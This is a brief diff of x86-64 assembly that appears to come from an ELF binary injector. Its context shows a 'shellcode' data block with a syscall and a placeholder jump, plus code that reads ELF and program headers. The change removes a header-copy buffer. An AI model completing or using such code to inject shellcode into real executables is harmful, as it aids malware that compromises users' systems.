@@ -36,7 +36,6 @@ section .data
         db 0x0F, 0x05
         db 0xFF, 0x00, 0x00, 0x00, 0x00 ; Jump to 0x00000000 (placeholder)
     shellcode_len equ $ - shellcode
-    modified_header times buffer_len db 0
 
 section .bss
     fd resq 1
@@ -169,12 +168,6 @@ retrieve_info:
     mov ax, word [rsi]  ; Get the e_phnum field
     movzx rax, ax
     mov [ph_num], rax
-
-    ; Copy the ELF header to the modified_header buffer
-    mov rsi, buffer
-    mov rdi, modified_header
-    mov rcx, buffer_len
-    rep movsb
 
     ; Parse program header
     mov rcx, [ph_num]
